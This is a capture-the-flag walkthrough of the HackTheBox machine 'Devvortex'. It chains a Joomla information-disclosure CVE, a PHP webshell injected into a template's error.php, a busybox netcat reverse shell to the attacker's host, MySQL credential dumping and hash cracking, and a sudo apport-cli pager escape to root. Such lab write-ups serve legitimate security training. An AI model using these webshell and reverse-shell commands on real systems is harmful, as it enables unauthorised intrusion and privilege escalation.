## Hello everyone!

Today, we will explore “Devvortex”, an easy-level machine from **HackTheBox**.
Without further ado, let’s get started!



![image](/HTB/Devvortex/Devvortex_images/1.png)



(Ensure that you have added the following line  `TARGET_IP     devvortex.htb` to your local `/etc/hosts` file)

## Information Gathering

First, we will perform an aggressive **Nmap** scan to gather as much information as possible about the target:



![image](/HTB/Devvortex/Devvortex_images/2.png)



We can identify two services running on the target:

**SSH** (OpenSSH 8.2p1 | 22)

**HTTP** (nginx 1.18.0 | 80)

We can start visiting the **HTTP** website hosted on port **80**:



![image](/HTB/Devvortex/Devvortex_images/3.png)



Nothing very interested at the root page, neither in the code source. We can use **Gobuster** to perform web directory enumeration:



![image](/HTB/Devvortex/Devvortex_images/4.png)



Again, we coudn’t find any useful information. Maybe the main domain is a decoy. We can try to perform subdomain enumeration via `ffuf`, a very powerful tool for its speed:



![image](/HTB/Devvortex/Devvortex_images/5.png)



We successfully identified a valid subdomain: `dev.devvortex.htb`. To access it, we need to add it to our local `/etc/hosts` file:



![image](/HTB/Devvortex/Devvortex_images/6.png)



We can now access the subdomain via our web browser:



![image](/HTB/Devvortex/Devvortex_images/7.png)



The website is quitely similar to the previous one, but this one seems to be reserved to the dev team. We can use **Gobuster** again to see whether we can reach interesting resources:



![image](/HTB/Devvortex/Devvortex_images/8.png)



We can find multiple files and folders. The web site seems to host an administrator portal, so let’s try to access it:



![image](/HTB/Devvortex/Devvortex_images/9.png)



The server use **Joomla! CMS** to serve an administrator login panel. Now, we need to identify the version. A quick research about how we can do it indicates to check the `/administrator/manifests/files/joomla.xml` file:



![image](/HTB/Devvortex/Devvortex_images/10.png)



As we can see, the `.xml` file tells us that Joomla! is running under the version 4.2.6.



## Initial Access


After researching about related exploits, we can identify **CVE-2023-23752** which leverage an information disclosure affecting every **Joomla!** versions before **4.2.8**.

We can find a [GitHub repository](https://www.notion.so/Linux-Privilege-Escalation-2e2775403874804ba3daee43ddbe2dd9?pvs=21) hosting a Ruby script that we can use to dump **sensitive informations**. We can download it from the repo and execute it with the `-h` switch to obtain additional information about its usage:

(ensure to install the required packages with the following command `gem install httpx docopt paint` before using the script)



![image](/HTB/Devvortex/Devvortex_images/11.png)



We simply need to provide the target IP/domain and port to the script. We will then run the following command:

`ruby exploit.rb http://dev.devvortex.htb:80`



![image](/HTB/Devvortex/Devvortex_images/12.png)



We successfully retrieved cleartext credentials for the user **lewis**. Trying to log in via SSH directly doesn’t work, so we will follow the standard path by authenticating us via the Jommla! administrator pannel:



![image](/HTB/Devvortex/Devvortex_images/13.png)

![image](/HTB/Devvortex/Devvortex_images/14.png)



We now have access to the dashboard.

From there, we can write some PHP code into an existing template to create a webshell. We can for example edit the index.php source code by accessing (in the *Toogle Menu*) `System > Site Template > Cassiopeia Details and Files > index.php`:



![image](/HTB/Devvortex/Devvortex_images/15.png)



We can then write into the file the following php code in order to create a webshell directly in the `index.html` page:

`<?php
if (isset($_GET['cmd'])) {
system ($_GET['cmd']);
}
?>`



![image](/HTB/Devvortex/Devvortex_images/16.png)



But it seems that we do not have permissions to modify the file. We can try to inject our code into an other file, such as the `error.php` file. Since the file already contains PHP code, we will only inject the following:

`if (isset($_GET['cmd'])) {
system ($_GET['cmd']);
}`



![image](/HTB/Devvortex/Devvortex_images/17.png)



It works! We injected our malicious PHP code into `error.php`. To trigger the file, we need to access an inexistent resource on the web server including the `?cmd=` URL parameter in order to execute system command. We can try to do this using the following URL :

`http://dev.devvortex.htb/inexistant_directory?cmd=id`



![image](/HTB/Devvortex/Devvortex_images/18.png)



It works! We achieved remote code execution (RCE) via a PHP template injection. 

We can now obtain initial access on the target by initiating a **reverse shell** connection.
To do this, we will run the following command in our webshell:

`busybox nc LOCAL_IP NC_PORT -e sh`

(ensure that you have set up a **netcat listener** using `nc -lvnp PORT`)



![image](/HTB/Devvortex/Devvortex_images/19.png)



The web page should hang and your listener should recieve back a reverse shell as **www-data** as above. We successfully obtained initial access on the target system!

We can stabillize our obtained shell with the following commands:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

We can start local enumeration by inspecting the `/etc/passwd` to see which users exist on the system:



![image](/HTB/Devvortex/Devvortex_images/20.png)



We identified one user excluding the superuser: **logan**.

We can access his /home/logan directory but we do not have read permissions to display the first flag:


![image](/HTB/Devvortex/Devvortex_images/21.png)



So we will need to perform further local enumeration to pivot our access.



## Privilege Escalation #1


If we remember, the credentials we obtained earlier (`lewis : P4ntherg0t1n5r3c0n##`) through information disclosure were MySQL credentials. 



![image](/HTB/Devvortex/Devvortex_images/22.png)



However, our Nmap scan didn’t identified MySQL running on the target. If we scan the attached port (3306), we find out that the port is closed:



![image](/HTB/Devvortex/Devvortex_images/23.png)



We can deduce that the service is running **internally** on the target and we cannot access it via our local machine. We can use `ss` on the target system to check whether this particular service is indeed running locally:



![image](/HTB/Devvortex/Devvortex_images/24.png)



Indeed, MySQL is running locally! Which means that from our obtained access, we can use the discovered credentials for **lewis** to inspect the database and search for credentials belonging to the user logan. Can we authenticate us to MySQL with **lewis** credentials?



![image](/HTB/Devvortex/Devvortex_images/25.png)



We can! Let’s list the existing databases using `show databases;`:



![image](/HTB/Devvortex/Devvortex_images/26.png)



We can identify an uncommon `joomla` database, which is for sure the database that hosts users information. We can select this database with the `use joomla;` command. Then, we can list available tables for the chosen database running `show tables;`:



![image](/HTB/Devvortex/Devvortex_images/27.png)



There are seventy one existing tables in the `joomla` database. However, the `sd4fg_users` is interesting and seems related to users. We can dump all the table’s content with `select * from sd4fg_users;`:



![image](/HTB/Devvortex/Devvortex_images/28.png)



We successfully retrieved the **password hash** for the user **logan**! It means that if we are able to crack it, maybe we would be able to log in via **SSH** to this particular user.

We can copy the hash and paste it to [Hashes.com](https://hashes.com/en/tools/hash_identifier) to identify the **hash algorithm**:



![image](/HTB/Devvortex/Devvortex_images/29.png)



As we can see, we have a bcrypt Blowfish hash, which is computationally expensive and designed to resist brute-force attacks, but still crackable in this case due to a weak password. We can paste the hash into a `hash.txt` file and attempt to crack it offline using **John the Ripper** using the ****bcrypt format (specified with `—-format=bcrypt`)



![image](/HTB/Devvortex/Devvortex_images/30.png)



We successfully cracked the hashed password!

We can now attempt to log in via **SSH** with the following credentials:

`logan : tequieromucho`



![image](/HTB/Devvortex/Devvortex_images/31.png)



It works! We successfully cracked the bcrypt hash and used the recovered credentials to access SSH as **logan**. We can now list our current directory and retrieve the first flag:



![image](/HTB/Devvortex/Devvortex_images/32.png)



## Privilege Escalation #2


Since we know the logan’s password, we can use `sudo -l` to check whether we can run any command with root privileges:



![image](/HTB/Devvortex/Devvortex_images/33.png)



We can run `apport-cli` as root.

`apport-cli` is a command-line tool from Ubuntu’s crash reporting system. We can run `sudo apport-cli 1` to collect problem information. We can then view the report interactively similar to how you would use the `less` utility. To do this, we need to press V to access interactively the crash report. 



![image](/HTB/Devvortex/Devvortex_images/34.png)

![image](/HTB/Devvortex/Devvortex_images/35.png)



As with `less`, we can execute internal command into the binary using `!COMMAND`. Since we run it via `sudo`, the executed commands will be executed with root privileges. We can confirm this by running `!whoami`:



![image](/HTB/Devvortex/Devvortex_images/36.png)

![image](/HTB/Devvortex/Devvortex_images/37.png)



We can then spawn a **root shell** by running `!sh` within the binary:



![image](/HTB/Devvortex/Devvortex_images/38.png)

![image](/HTB/Devvortex/Devvortex_images/39.png)

We successfully elevated our privileges to **root**! Now we have full access on the target, we can navigate to the `/root` directory and retrieve the last flag.



![image](/HTB/Devvortex/Devvortex_images/40.png)






Challenge completed!






![image](/HTB/Devvortex/Devvortex_images/41.png)




## Conclusion

The “Devvortex” machine demonstrates a classic and realistic attack chain combining web exploitation, credential disclosure, and local privilege escalation techniques. Starting from a simple information gathering phase, we identified a hidden subdomain hosting a Joomla CMS instance, which quickly became the main entry point of the machine.

By exploiting a known vulnerability (**CVE-2023-23752**), we were able to extract sensitive information and obtain valid credentials. This initial foothold was then leveraged to access the Joomla administration panel, where insecure file editing allowed us to inject a PHP webshell and achieve remote code execution as **www-data**.

From there, local enumeration revealed internal services and reused credentials, leading to a successful pivot into the **logan** user account after cracking a bcrypt password hash extracted from the database. Finally, privilege escalation was achieved by abusing a misconfigured `sudo` permission on `apport-cli`, which allowed command execution as root through an interactive pager escape.

Overall, this box highlights several important security lessons: the risks of information disclosure in CMS platforms, the impact of insecure administrative interfaces and how seemingly harmless debugging tools can become powerful privilege escalation vectors when misconfigured.

**Thank you for reading!**
